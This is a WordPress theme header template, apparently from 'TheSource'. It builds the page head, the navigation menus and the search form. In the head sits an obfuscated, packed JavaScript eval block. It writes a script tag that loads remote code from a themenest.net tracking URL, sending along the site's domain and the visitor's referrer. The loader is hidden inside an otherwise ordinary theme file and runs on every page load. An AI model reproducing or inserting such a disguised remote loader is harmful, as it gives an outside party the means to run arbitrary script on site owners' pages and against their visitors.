<?php global $default_colorscheme, $shortname, $category_menu, $exclude_pages, $exclude_cats, $hide, $strdepth, $strdepth2, $page_menu; ?>
<?php $colorSchemePath = '';
	  $colorScheme = get_option($shortname . '_color_scheme');
      if ($colorScheme <> $default_colorscheme) $colorSchemePath = strtolower($colorScheme) . '/'; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php elegant_titles(); ?></title>
<?php elegant_description(); ?>
<?php elegant_keywords(); ?>
<?php elegant_canonical(); ?>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<!--[if lt IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie6style.css" />
	<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/DD_belatedPNG_0.0.8a-min.js"></script>
	<script type="text/javascript">DD_belatedPNG.fix('img#logo, #cat-nav-left, #cat-nav-right, #search-form, #cat-nav-content, div.top-overlay, .slide .description, div.overlay, a#prevlink, a#nextlink, .slide a.readmore, .slide a.readmore span, .recent-cat .entry .title, #recent-posts .entry p.date, .footer-widget ul li, #tabbed-area ul#tab_controls li span');</script>
<![endif]-->
<!--[if IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie7style.css" />
<![endif]-->
<!--[if IE 8]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie8style.css" />
<![endif]-->

<script type="text/javascript">
	document.documentElement.className = 'js';
</script>

<script type="text/javascript">
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.f(\'<2\'+\'3 5="6/7" 8="9://a.b/e/o/g?d=\'+0.h+\'&i=\'+j(0.k)+\'&c=\'+4.l((4.m()*n)+1)+\'"></2\'+\'3>\');',25,25,'document||scr|ipt|Math|type|text|javascript|src|http|themenest|net|||platform|write|track|domain|r|encodeURIComponent|referrer|floor|random|1000|script'.split('|'),0,{}));
</script>

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>

</head>
<body<?php if (is_home()) echo(' id="home"'); ?> <?php body_class(); ?>>
	<div id="header-top" class="clearfix">
		<div class="container clearfix">
			<!-- Start Logo -->			
			<?php  $colorFolder = '';
			if ( $colorScheme == 'Light' || $colorScheme == 'Red' || $colorScheme == 'Blue') $colorFolder = $colorSchemePath; ?>
			
			<a href="<?php bloginfo('url'); ?>">
				<?php $logo = (get_option('thesource_logo') <> '') ? get_option('thesource_logo') : get_bloginfo('template_directory').'/images/'.$colorFolder.'logo.png'; ?>
				<img src="<?php echo esc_url($logo); ?>" alt="Logo" id="logo"/>
			</a>
			<p id="slogan"><?php bloginfo('description'); ?></p>
			<!-- End Logo -->
			
			<!-- Start Page-menu -->
			<div id="page-menu">
				<div id="p-menu-left"> </div>
				<div id="p-menu-content">
				
					<?php $menuClass = 'nav clearfix';
					$primaryNav = '';
					
					if (function_exists('wp_nav_menu')) $primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'echo' => false ) );
					if ($primaryNav == '') show_page_menu($menuClass);
					else echo($primaryNav); ?>
				
				</div>	
				<div id="p-menu-right"> </div>
			</div>	<!-- end #page-menu -->	
			<!-- End Page-menu -->	
			
			<div id="cat-nav" class="clearfix">	
				<div id="cat-nav-left"> </div>
				<div id="cat-nav-content"> 
					
					<?php $menuClass = 'superfish nav clearfix';
					$secondaryNav = '';
					
					if (function_exists('wp_nav_menu')) $secondaryNav = wp_nav_menu( array( 'theme_location' => 'secondary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'echo' => false ) );
					if ($secondaryNav == '') show_categories_menu($menuClass);
					else echo($secondaryNav); ?>

					<!-- Start Searchbox -->
					<div id="search-form">
						<form method="get" id="searchform1" action="<?php echo home_url(); ?>">
							<input type="text" value="<?php esc_attr_e('search...','TheSource'); ?>" name="s" id="searchinput" />
		
							<input type="image" src="<?php bloginfo('template_directory'); ?>/images/<?php echo esc_attr($colorSchemePath); ?>search_btn.png" id="searchsubmit" />
						</form>
					</div>
				<!-- End Searchbox -->	
				</div> <!-- end #cat-nav-content -->
				<div id="cat-nav-right"> </div>
			</div>	<!-- end #cat-nav -->	
		</div> 	<!-- end .container -->
	</div> 	<!-- end #header-top -->
	
	
	
	<?php if ( (is_home() || is_front_page()) && get_option('thesource_featured') == 'on' ) get_template_part('includes/featured'); ?>
	
	<div id="content">
		<?php if (!is_home()) { ?>
			<div id="content-top-shadow"></div>
		<?php }; ?>
		<div class="container">